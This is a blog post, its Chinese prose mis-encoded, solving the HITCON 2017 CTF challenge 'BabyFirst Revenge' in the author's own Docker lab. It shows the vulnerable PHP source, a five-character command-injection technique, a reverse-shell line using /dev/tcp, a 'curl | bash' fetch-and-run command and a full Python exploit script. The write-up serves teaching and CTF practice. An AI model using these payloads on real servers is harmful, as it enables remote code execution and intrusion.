<!DOCTYPE html>
<html lang="pt">

  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->
    <title>[hitcon2017] BabyFirst Revengeå¤ç° | Pr0ph3t's blog</title>

    <!-- Bootstrap -->
    <link rel="stylesheet" href="/assets/css/bootstrap-3.3.6/css/bootstrap.min.css">
    <link rel="stylesheet" href="/assets/css/main.css">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />

    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
    <!--[if lt IE 9]>
          <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
          <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
        <![endif]-->

    <script>
(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
    (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
    m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
})(window,document,'script','//www.google-analytics.com/analytics.js','ga');

    ga('create', 'UA-69613510-1', 'auto');
    ga('send', 'pageview');

</script>


    <link rel="shortcut icon" href="/assets/images/favicon.png">

    <link rel="alternate" type="application/atom+xml" title="Atom Feed" href="/feed/"> 

</head>


    <body>
      <div class="container">

        <header class="row">
  <div class="col-lg-8 col-lg-offset-2">
    <h1 class="">Pr0ph3t</h1>
    <p>
    <span class="reserved">char</span> nick[<span class="number">9</span>] = <span class="string">"Pr0ph3t"</span>;
    </p>
    <p>
    printf(<a href="https://github.com/t3hp0rP" target="_blank"><span class="string">"https://github.com/<span class="reserved">%s\n</span>"</span></a>,nick);
    </p>
    <p>
    printf(<span class="string">"<span class="reserved">%s\x40</span>pr0ph3t<span class="reserved">\x2e\\\b</span>com<span class="reserved">\n</span>"</span>,<span class="string">"admin"</span>);
    </p>
    <!-- <p>
            printf(<a href="https://blog.pr0ph3t.com" target="_blank"><span class="string">"https://<span class="reserved">%s</span>.pr0ph3t.com<span class="reserved">\n</span>"</span></a>,nick);
        </p> -->
    <p>
    puts(<a href="/assets/misc/pubkey.gpg.txt" target="_blank"><span class="string">"91B6Â 191AÂ C2C3Â 285CÂ 201DÂ Â 801BÂ B5A3Â 6B56Â 8528Â E140"</span></a>);
    </p>
  </div>
</header>

<div class="row">
  <div class="col-lg-8 col-lg-offset-2">
    <div class="menu">
      <ul>
          <li><a href="/">home</a></li>
          <li><a href="/blog/">blog</a></li>
          <li><a href="/friendlink">friends</a></li>
      </ul>
    </div>
  </div>
</div>



        <div class="row">
          <div class="col-lg-8 col-lg-offset-2">
            <main>
            <div class="post">

  <header class="post-header">
    <h1>[hitcon2017] BabyFirst Revengeå¤ç°</h1>
  </header>

  <article class="post-content">
  <div class="post">

  <header class="post-header">
    <p class="meta">
        Nov 27, 2017
        
        
        â€¢
        <span><a href="/category/#CyberSecurity" class="reserved">CyberSecurity</a>,</span><span><a href="/category/#writeup" class="reserved">writeup</a>,</span><span><a href="/category/#hitcon" class="reserved">hitcon</a>,</span><span><a href="/category/#old" class="reserved">old</a></span>
    </p>
  </header>

  <article class="post-content">
  <p>hitconçš„é¢˜å¥½éš¾å•Šï¼ï¼ï¼ï¼ï¼<br>
è¿˜æ˜¯å¤ªèœäº†ã€‚ã€‚Orz<br>
åªèƒ½å¤Ÿèµ›åæ­ç¯å¢ƒå¤ç°äº†ã€‚ã€‚<br>
åˆ†äº«æœ¬é¢˜è‡ªåˆ¶Dockerfileï¼š<a href="https://github.com/Pr0phet/hitcon2017Dockerfile/tree/master/hitcon-ctf-2017/babyfirst-revenge">Github</a> </p>

<p>è¿™é¢˜æ˜¯ä¸€ä¸ªç‰¹åˆ«çš„å‘½ä»¤æ‰§è¡Œé¢˜ï¼Œ é¦–å…ˆè¿›å»é¦–é¡µä¹‹åå‘ç°ä»¥ä¸‹æºç </p>
<div class="highlight"><pre><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span>
    <span class="nv">$sandbox</span> <span class="o">=</span> <span class="s1">'/www/sandbox/'</span> <span class="o">.</span> <span class="nb">md5</span><span class="p">(</span><span class="s2">"orange"</span> <span class="o">.</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'REMOTE_ADDR'</span><span class="p">]);</span>
    <span class="o">@</span><span class="nb">mkdir</span><span class="p">(</span><span class="nv">$sandbox</span><span class="p">);</span>
    <span class="o">@</span><span class="nb">chdir</span><span class="p">(</span><span class="nv">$sandbox</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'cmd'</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nb">strlen</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'cmd'</span><span class="p">])</span> <span class="o">&lt;=</span> <span class="mi">5</span><span class="p">)</span> <span class="p">{</span>
        <span class="o">@</span><span class="nb">exec</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'cmd'</span><span class="p">]);</span>
    <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'reset'</span><span class="p">]))</span> <span class="p">{</span>
        <span class="o">@</span><span class="nb">exec</span><span class="p">(</span><span class="s1">'/bin/rm -rf '</span> <span class="o">.</span> <span class="nv">$sandbox</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="nb">highlight_file</span><span class="p">(</span><span class="k">__FILE__</span><span class="p">);</span>
</code></pre></div>
<hr>

<p>æ— è®ºæˆ‘ä»¬ä¼ ä»€ä¹ˆè¿›å»ä»–éƒ½ä¼šç…§å•æ‰§è¡Œï¼Œä½†æ˜¯æ¯æ¬¡çš„é•¿åº¦é™åˆ¶ä¸ºæœ€å¤š5ä¸ªå­—ç¬¦ï¼Œæ­£å¸¸æ¥è¯´æœ€çŸ­(?)çš„å†™shellæ–¹å¼åº”è¯¥æ˜¯</p>
<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nb">echo </span>x&gt;&gt;1
....
sh 1
</code></pre></div>
<p>ä½†æ˜¯å…¶å®æˆ‘ä»¬å¯ä»¥åˆ©ç”¨lsæ¥å†™shellï¼Œå¦‚ä¸‹ï¼š</p>
<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="o">&gt;</span>a
<span class="nb">ls</span><span class="o">&gt;</span>_
sh _  <span class="c">#ä¹Ÿå°±æ‰§è¡Œäº†aæŒ‡ä»¤ ä½†æ˜¯æ²¡æœ‰æ„ä¹‰ï¼Œæ‰€ä»¥æˆ‘ä»¬å°±è¦æ„é€ ä¸€ç³»åˆ—çš„æŒ‡ä»¤å‡ºæ¥è¿½åŠ åˆ°æ–‡ä»¶é‡Œ</span>
</code></pre></div>
<p>é‚£ä¹ˆè¿™é‡Œå°±æ¶‰åŠåˆ°å‡ ä¸ªé—®é¢˜ï¼š<br>
1. lså‡ºæ¥æ˜¯æŒ‰ç…§ä»€ä¹ˆé¡ºåºæ’åˆ—çš„æ–‡ä»¶ï¼Ÿ<br>
2. è¿½åŠ æ–‡ä»¶çš„æ—¶å€™ä¼šè‡ªåŠ¨åŠ å…¥æ¢è¡Œ è¿™ä¸ªé—®é¢˜è¦æ€ä¹ˆè§£å†³ï¼Ÿ<br>
3. å¦‚æœlsé€”ä¸­æœ‰æ— ç”¨çš„æ–‡ä»¶æ€ä¹ˆåŠï¼Ÿ å› ä¸ºå¦‚æœæ˜¯ä»¥ä¸Šçš„åšæ³•çš„è¯å…¶å®<code class="prettyprint">cat _</code>ä½ ä¼šå‘ç°é‡Œé¢è¿˜æœ‰ä¸€ä¸ª<code class="prettyprint">_</code>æ–‡ä»¶</p>

<blockquote>
<p>ç­”æ¡ˆï¼š<br>
1. ls -lçš„é»˜è®¤æ’åºæ–¹å¼æ‰‹å†Œä¸Šå†™äº†æ˜¯alphabeticallyï¼ˆå­—å…¸åºï¼‰ä¹Ÿå°±æ˜¯è¯´æœ‰å¯èƒ½åé¢åŠ å…¥çš„æ–‡ä»¶åæ’åœ¨å‰é¢ï¼Œä¸ºäº†é¿å…è¿™ä¸ªé—®é¢˜æˆ‘ä»¬å¯ä»¥åŠ å…¥-tå‚æ•°æ¥ä½¿lsä¹‹åçš„ç»“æœæŒ‰ç…§æœ€è¿‘ä¿®æ”¹çš„æ–‡ä»¶åœ¨å‰é¢çš„æ–¹å¼æ’åˆ—<br>
2. linuxçš„å‘½ä»¤æ‰§è¡Œä¸­æ”¯æŒå‘½ä»¤æ¢è¡Œ éœ€è¦ç”¨åˆ°åæ–œæ \ å†™åˆ°æœ€åé¢ï¼Œå¦‚ï¼š<img src="/assets/images/posts/2017/hitcon2017-BabyFirst-Revenge-%E5%A4%8D%E7%8E%B0/1.png" alt="ğŸŒ°"><br>
3. å…¶å®bashåœ¨æ‰§è¡Œè„šæœ¬çš„æ—¶å€™é‡åˆ°æœªçŸ¥çš„å‘½ä»¤ä¼šæŠ¥é”™ ä½†æ˜¯è¿™å¹¶ä¸ä¼šä½¿ä¹‹é€€å‡ºï¼Œbashä¼šç»§ç»­æ‰§è¡Œä¸‹ä¸€è¡Œçš„å‘½ä»¤ï¼Œå¦‚å›¾<img src="/assets/images/posts/2017/hitcon2017-BabyFirst-Revenge-%E5%A4%8D%E7%8E%B0/2.png" alt="ğŸŒ°"></p>
</blockquote>

<p>é‚£åˆ°è¿™é‡Œæ€è·¯å…¶å®å·²ç»æŒºæ¸…æ™°çš„äº†, å°±æ˜¯é€šè¿‡å†™å…¥ä¸€ç³»åˆ—æŒ‡ä»¤çš„åˆ†æ®µï¼Œå¹¶ç”¨åæ–œæ \ä½œä¸ºæ–‡ä»¶ç»“å°¾ï¼Œæœ€åæ‰§è¡Œls -t&gt;gå¹¶ä¸”sh gæ¥æ‰§è¡Œæˆ‘ä»¬æƒ³è¦çš„æŒ‡ä»¤ï¼Œè¿™é‡Œä»¥æ‰§è¡Œåå¼¹shellä¸ºä¾‹ï¼š</p>
<div class="highlight"><pre><code class="language-bash" data-lang="bash">curl 10.188.2.20|bash
</code></pre></div>
<p>æˆ‘çš„10.188.2.20/index.htmlæ–‡ä»¶å†…å®¹ä¸º:</p>
<div class="highlight"><pre><code class="language-bash" data-lang="bash">bash <span class="nt">-i</span> <span class="o">&gt;</span>&amp; /dev/tcp/10.188.2.20/12345 0&gt;&amp;1
</code></pre></div>
<ul>
<li>å†™å…¥ ls -t&gt;gæŒ‡ä»¤åˆ°_æ–‡ä»¶</li>
</ul>
<div class="highlight"><pre><code class="language-bash" data-lang="bash">?cmd<span class="o">=&gt;</span><span class="nb">ls</span><span class="se">\\</span>    <span class="c">#åˆ›å»ºls\</span>
?cmd<span class="o">=</span><span class="nb">ls</span><span class="o">&gt;</span>_    <span class="c">#åˆ›å»º _ æ–‡ä»¶ æ–‡ä»¶å†…å®¹ä¸º_ \n ls\ \n</span>
?cmd<span class="o">=&gt;</span><span class="se">\ \\</span>    <span class="c">#åˆ›å»º \ç©ºæ ¼ æ–‡ä»¶</span>
?cmd<span class="o">=&gt;</span><span class="nt">-t</span><span class="se">\\</span>    <span class="c">#åˆ›å»º -t\ æ–‡ä»¶</span>
?cmd<span class="o">=&gt;</span><span class="se">\&gt;</span>g    <span class="c">#åˆ›å»º &gt;g æ–‡ä»¶</span>
?cmd<span class="o">=</span><span class="nb">ls</span><span class="o">&gt;&gt;</span>_   <span class="c">#å°†åˆšåˆšåˆ›å»ºçš„æ–‡ä»¶åæŒ‰ç…§å­—å…¸åºå†™å…¥_æ–‡ä»¶ è¿™é‡Œçš„å­—å…¸åºæ˜¯ç‰¹æ®Šç¬¦å·åœ¨ls\çš„å‰é¢ æ‰€ä»¥åœ¨ç”Ÿæˆls\ä¹‹åæˆ‘ä»¬è¦å…ˆls&gt;_ ä¿è¯ls\åœ¨æœ€å‰é¢</span>
</code></pre></div>
<p>æœ€åç”Ÿæˆçš„_æ–‡ä»¶ç»“æœå¦‚å›¾ï¼š<br>
<img src="/assets/images/posts/2017/hitcon2017-BabyFirst-Revenge-%E5%A4%8D%E7%8E%B0/3.png" alt="_ æ–‡ä»¶"></p>

<p>æœ€åæˆ‘ä»¬éœ€è¦ç”Ÿæˆæˆ‘ä»¬è‡ªå·±çš„å‘½ä»¤çš„æ—¶å€™ç›´æ¥sh _å°±å¯ä»¥åœ¨gæ–‡ä»¶é‡Œé¢ç”Ÿæˆæˆ‘ä»¬æƒ³è¦çš„å‘½ä»¤äº† ç„¶åå†sh gå°±å¯ä»¥rceäº†</p>

<p>æ¯”å¦‚æˆ‘è¦æ‰§è¡Œ curl 10.188.2.20|bash (index.htmlå·²ç»æå‰æ”¾å¥½åå¼¹shellçš„å‘½ä»¤)</p>

<p>å› ä¸ºè¿™æ˜¯æŒ‰ç…§æ—¶é—´å€’å™ls æ‰€ä»¥æˆ‘è¦å€’ç€ç”Ÿæˆæˆ‘è¦æ‰§è¡Œçš„æŒ‡ä»¤æ–‡ä»¶ï¼Œæ¯”å¦‚orangeå¤§å¤§çš„expï¼š</p>
<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">from</span> <span class="nn">time</span> <span class="kn">import</span> <span class="n">sleep</span>
<span class="kn">from</span> <span class="nn">urllib</span> <span class="kn">import</span> <span class="n">quote</span>

<span class="n">payload</span> <span class="o">=</span> <span class="p">[</span>
    <span class="c1"># generate `ls -t&gt;g` file
</span>    <span class="s">'&gt;ls</span><span class="se">\\</span><span class="s">'</span><span class="p">,</span> 
    <span class="s">'ls&gt;_'</span><span class="p">,</span> 
    <span class="s">'&gt;</span><span class="err">\</span><span class="s"> </span><span class="se">\\</span><span class="s">'</span><span class="p">,</span> 
    <span class="s">'&gt;-t</span><span class="se">\\</span><span class="s">'</span><span class="p">,</span> 
    <span class="s">'&gt;</span><span class="err">\</span><span class="s">&gt;g'</span><span class="p">,</span> 
    <span class="s">'ls&gt;&gt;_'</span><span class="p">,</span> 

    <span class="c1"># generate `curl orange.tw.tw|python`
</span>    <span class="c1"># generate `curl 10.188.2.20|bash` 
</span>    <span class="s">'&gt;sh</span><span class="err">\</span><span class="s"> '</span><span class="p">,</span> 
    <span class="s">'&gt;ba</span><span class="se">\\</span><span class="s">'</span><span class="p">,</span> 
    <span class="s">'&gt;</span><span class="err">\</span><span class="s">|</span><span class="se">\\</span><span class="s">'</span><span class="p">,</span>
    <span class="s">'&gt;20</span><span class="se">\\</span><span class="s">'</span><span class="p">,</span>
    <span class="s">'&gt;2.</span><span class="se">\\</span><span class="s">'</span><span class="p">,</span> 
    <span class="s">'&gt;8.</span><span class="se">\\</span><span class="s">'</span><span class="p">,</span>
    <span class="s">'&gt;18</span><span class="se">\\</span><span class="s">'</span><span class="p">,</span> 
    <span class="s">'&gt;0.</span><span class="se">\\</span><span class="s">'</span><span class="p">,</span> 
    <span class="s">'&gt;1</span><span class="se">\\</span><span class="s">'</span><span class="p">,</span> 
    <span class="s">'&gt;</span><span class="err">\</span><span class="s"> </span><span class="se">\\</span><span class="s">'</span><span class="p">,</span> 
    <span class="s">'&gt;rl</span><span class="se">\\</span><span class="s">'</span><span class="p">,</span> 
    <span class="s">'&gt;cu</span><span class="se">\\</span><span class="s">'</span><span class="p">,</span> 

    <span class="c1"># exec
</span>    <span class="s">'sh _'</span><span class="p">,</span> 
    <span class="s">'sh g'</span><span class="p">,</span> 
<span class="p">]</span>



<span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s">'http://10.188.2.20:22460/?reset=1'</span><span class="p">)</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">payload</span><span class="p">:</span>
    <span class="k">assert</span> <span class="nb">len</span><span class="p">(</span><span class="n">i</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="mi">5</span> 
    <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s">'http://10.188.2.20:22460/?cmd='</span> <span class="o">+</span> <span class="n">quote</span><span class="p">(</span><span class="n">i</span><span class="p">)</span> <span class="p">)</span>
    <span class="k">print</span> <span class="n">i</span>
    <span class="n">sleep</span><span class="p">(</span><span class="mf">0.2</span><span class="p">)</span>
</code></pre></div>
<p>åœ¨ç”Ÿæˆè‡ªå·±çš„å‘½ä»¤æ—¶è¦æ³¨æ„å„ä¸ªå‘½ä»¤æ®µä¹‹é—´åå­—ä¸èƒ½ç›¸åŒ å› ä¸ºä¸èƒ½ç”Ÿæˆä¸¤ä¸ªå¸¦æœ‰ç›¸åŒå‘½ä»¤æ®µçš„æ–‡ä»¶å</p>

<p>//å·æ‡’å·äº†å¥½ä¹…æ‰å¤ç°çš„ã€‚ã€‚Orzã€‚ã€‚ã€‚ã€‚æ‰¹è¯„ä¸€ä¸‹è‡ªå·±çš„æ‡’æƒ°ã€‚ã€‚<br>
å„ä½å¤§ä½¬æœ‰å•¥æ›´å¥½çš„æ€è·¯æ¬¢è¿åˆ†äº«</p>

<p>å‚è€ƒ:<br>
<a href="https://github.com/orangetw/My-CTF-Web-Challenges">https://github.com/orangetw/My-CTF-Web-Challenges</a></p>

  </article>

	<p class="feed-recomendation">
		Did you like the post? Subscribe to the <a href="/feed/">feed</a>.
	</p>

  <div id="disqus_thread"></div>
<script type="text/javascript">
    /* * * CONFIGURATION VARIABLES * * */
    var disqus_shortname = 'pr0ph3t';
    var disqus_config = function () {
        this.page.identifier = "/blog/hitcon2017-BabyFirst-Revenge%E5%A4%8D%E7%8E%B0/";
    };
    
    /* * * DON'T EDIT BELOW THIS LINE * * */
    (function() {
        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
    })();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a></noscript>




</div>

  </article>

</div>

            </main>
          </div>
        </div>

        <div class="row">
  <div class="col-lg-8 col-lg-offset-2">
    <footer>
      Thx!
    </footer>
  </div>
</div>
<script src="//code.jquery.com/jquery-3.3.1.min.js"></script>
<script src="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script>
<script>
$(document).ready(function() {
	$("img").each(function() {
		var strA = "<a data-fancybox='gallery' href='" + this.src + "'></a>";
		$(this).wrapAll(strA);
    });
});
</script>
<!-- <script type="text/javascript" src="/assets/js/images.js"></script> -->

      </div>
    </body>
</html>
